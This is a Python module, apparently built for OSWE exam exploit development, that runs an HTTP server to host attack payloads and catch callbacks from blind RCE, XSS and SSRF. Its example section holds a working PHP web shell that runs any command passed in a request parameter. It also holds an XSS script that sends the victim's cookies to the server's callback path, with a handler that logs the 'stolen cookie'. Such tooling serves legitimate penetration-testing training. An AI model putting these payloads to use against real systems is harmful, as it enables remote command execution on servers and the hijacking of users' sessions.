#!/usr/bin/env python3
"""
Custom Payload Server Module for OSWE PoC Development

Provides HTTP server for:
- Hosting malicious payloads (shells, plugins, etc.)
- Catching callbacks (XSS, SSRF, blind RCE verification)
- Logging all requests
- Serving dynamic content based on requests

Usage:
    from modules.payload_server import PayloadServer

    server = PayloadServer(port=8000)
    server.add_payload("/shell.php", php_shell_content, content_type="application/x-php")
    server.add_callback_handler("/xss", lambda req: print(f"XSS triggered from {req.client_address}"))
    server.start()  # Runs in background thread
    # ... exploit code ...
    server.stop()
"""

import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Dict, Callable, Optional, Tuple
from datetime import datetime
import urllib.parse


class PayloadRequestHandler(BaseHTTPRequestHandler):
    """
    Custom HTTP request handler for payload delivery and callbacks.
    """

    # Class-level storage for payloads and callbacks
    payloads: Dict[str, Tuple[bytes, str]] = {}  # path -> (content, content_type)
    callbacks: Dict[str, Callable] = {}  # path -> callback_function
    request_log: list = []
    verbose: bool = True

    def log_request_custom(self, code=200, size='-'):
        """Log request details."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = {
            'timestamp': timestamp,
            'client': self.client_address[0],
            'method': self.command,
            'path': self.path,
            'code': code,
            'user_agent': self.headers.get('User-Agent', ''),
        }

        PayloadRequestHandler.request_log.append(log_entry)

        if PayloadRequestHandler.verbose:
            print(f"[{timestamp}] {self.client_address[0]} - {self.command} {self.path} - {code}")

    def do_GET(self):
        """Handle GET requests."""
        self.handle_request()

    def do_POST(self):
        """Handle POST requests."""
        self.handle_request()

    def handle_request(self):
        """Process incoming HTTP request."""
        # Parse URL
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        query_params = urllib.parse.parse_qs(parsed_path.query)

        # Check if this is a payload delivery
        if path in self.payloads:
            content, content_type = self.payloads[path]
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', str(len(content)))
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(content)
            self.log_request_custom(200, len(content))
            return

        # Check if this is a callback handler
        if path in self.callbacks:
            callback = self.callbacks[path]

            # Extract request data
            request_data = {
                'path': self.path,
                'method': self.command,
                'client': self.client_address[0],
                'headers': dict(self.headers),
                'query_params': query_params,
            }

            # Read POST body if present
            if self.command == 'POST':
                content_length = int(self.headers.get('Content-Length', 0))
                request_data['body'] = self.rfile.read(content_length).decode('utf-8', errors='ignore')

            # Execute callback
            try:
                callback(request_data)
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"OK")
                self.log_request_custom(200)
            except Exception as e:
                print(f"[!] Callback error: {e}")
                self.send_response(500)
                self.end_headers()
                self.log_request_custom(500)
            return

        # Default: 404
        self.send_response(404)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Not Found")
        self.log_request_custom(404)

    def log_message(self, format, *args):
        """Override to suppress default logging."""
        pass  # We use custom logging


class PayloadServer:
    """
    HTTP server for hosting payloads and catching callbacks.

    Features:
    - Host arbitrary files (shells, exploits, etc.)
    - Catch callbacks from blind RCE/XSS/SSRF
    - Dynamic content based on client
    - Request logging
    - Background threading
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8000, verbose: bool = True):
        """
        Initialize payload server.

        Args:
            host: Bind address
            port: Bind port
            verbose: Enable verbose output
        """
        self.host = host
        self.port = port
        self.verbose = verbose

        PayloadRequestHandler.verbose = verbose

        # Server components
        self.server: Optional[HTTPServer] = None
        self.thread: Optional[threading.Thread] = None
        self.running = False

    def add_payload(self, path: str, content: bytes, content_type: str = "application/octet-stream"):
        """
        Add a payload to be served.

        Args:
            path: URL path (e.g., "/shell.php")
            content: File content (bytes)
            content_type: MIME type
        """
        if isinstance(content, str):
            content = content.encode('utf-8')

        PayloadRequestHandler.payloads[path] = (content, content_type)

        if self.verbose:
            print(f"[*] Payload added: {path} ({len(content)} bytes, {content_type})")

    def add_payload_from_file(self, path: str, file_path: str, content_type: str = None):
        """
        Add payload from file.

        Args:
            path: URL path
            file_path: Path to file on disk
            content_type: MIME type (auto-detected if None)
        """
        file_obj = Path(file_path)

        if not file_obj.exists():
            raise FileNotFoundError(f"Payload file not found: {file_path}")

        content = file_obj.read_bytes()

        # Auto-detect content type if not specified
        if content_type is None:
            ext = file_obj.suffix.lower()
            content_types = {
                '.php': 'application/x-php',
                '.jsp': 'application/x-jsp',
                '.html': 'text/html',
                '.js': 'application/javascript',
                '.txt': 'text/plain',
                '.sh': 'application/x-sh',
                '.py': 'text/x-python',
            }
            content_type = content_types.get(ext, 'application/octet-stream')

        self.add_payload(path, content, content_type)

    def add_callback_handler(self, path: str, callback: Callable):
        """
        Add callback handler for a path.

        Args:
            path: URL path (e.g., "/xss-callback")
            callback: Function to call when path is accessed
                      Function signature: callback(request_data: dict)
        """
        PayloadRequestHandler.callbacks[path] = callback

        if self.verbose:
            print(f"[*] Callback handler added: {path}")

    def start(self, blocking: bool = False):
        """
        Start the payload server.

        Args:
            blocking: If True, run in current thread (blocks). If False, run in background thread.
        """
        try:
            self.server = HTTPServer((self.host, self.port), PayloadRequestHandler)
            self.running = True

            if self.verbose:
                print(f"[+] Payload server started on {self.host}:{self.port}")
                print(f"[*] Serving {len(PayloadRequestHandler.payloads)} payload(s)")
                print(f"[*] Handling {len(PayloadRequestHandler.callbacks)} callback(s)")

            if blocking:
                # Run in current thread
                self.server.serve_forever()
            else:
                # Run in background thread
                self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
                self.thread.start()

                if self.verbose:
                    print(f"[*] Server running in background (thread: {self.thread.name})")

        except OSError as e:
            if "Address already in use" in str(e):
                print(f"[-] Port {self.port} already in use")
            else:
                print(f"[-] Failed to start server: {e}")
            raise

    def stop(self):
        """Stop the payload server."""
        if self.server and self.running:
            self.server.shutdown()
            self.server.server_close()
            self.running = False

            if self.verbose:
                print(f"[*] Payload server stopped")

    def wait_for_callback(self, path: str, timeout: int = 60) -> bool:
        """
        Wait for a specific callback to be triggered.

        Args:
            path: Callback path to wait for
            timeout: Timeout in seconds

        Returns:
            True if callback was triggered, False if timeout
        """
        import time

        start_time = time.time()
        initial_log_length = len(PayloadRequestHandler.request_log)

        if self.verbose:
            print(f"[*] Waiting for callback on {path} (timeout: {timeout}s)...")

        while time.time() - start_time < timeout:
            # Check if new requests came in
            if len(PayloadRequestHandler.request_log) > initial_log_length:
                # Check if any match our path
                for log_entry in PayloadRequestHandler.request_log[initial_log_length:]:
                    if log_entry['path'].startswith(path):
                        if self.verbose:
                            print(f"[+] Callback received from {log_entry['client']}")
                        return True

            time.sleep(0.5)

        if self.verbose:
            print(f"[-] Callback timeout after {timeout}s")
        return False

    def get_requests(self) -> list:
        """Get all logged requests."""
        return PayloadRequestHandler.request_log.copy()

    def clear_requests(self):
        """Clear request log."""
        PayloadRequestHandler.request_log.clear()

    def get_url(self, path: str = "/") -> str:
        """
        Get full URL for a path.

        Args:
            path: URL path

        Returns:
            Full URL
        """
        # Get local IP if binding to 0.0.0.0
        if self.host == "0.0.0.0":
            # Try to get local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                local_ip = "127.0.0.1"
            return f"http://{local_ip}:{self.port}{path}"
        else:
            return f"http://{self.host}:{self.port}{path}"


# Example usage
if __name__ == "__main__":
    import time

    # Create server
    server = PayloadServer(port=8000)

    # Add PHP shell payload
    php_shell = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>"""
    server.add_payload("/shell.php", php_shell, "application/x-php")

    # Add JavaScript payload for XSS
    js_payload = """
(function(){
    var img = new Image();
    img.src = 'http://localhost:8000/xss-callback?cookie=' + document.cookie;
})();
"""
    server.add_payload("/xss.js", js_payload, "application/javascript")

    # Add callback handler
    def xss_callback(request_data):
        print(f"\n[+] XSS Callback from {request_data['client']}")
        if 'cookie' in request_data['query_params']:
            cookie = request_data['query_params']['cookie'][0]
            print(f"[+] Stolen cookie: {cookie}")

    server.add_callback_handler("/xss-callback", xss_callback)

    # Add blind RCE verification callback
    def rce_callback(request_data):
        print(f"\n[+] RCE Confirmed! Callback from {request_data['client']}")
        print(f"[+] User-Agent: {request_data['headers'].get('User-Agent', 'N/A')}")

    server.add_callback_handler("/rce-verify", rce_callback)

    # Start server
    server.start(blocking=False)

    print(f"\n[*] Test URLs:")
    print(f"    PHP Shell: {server.get_url('/shell.php')}?cmd=whoami")
    print(f"    XSS Payload: {server.get_url('/xss.js')}")
    print(f"    RCE Verify: curl {server.get_url('/rce-verify')}")

    # Keep running
    try:
        print(f"\n[*] Server is running. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping server...")
        server.stop()
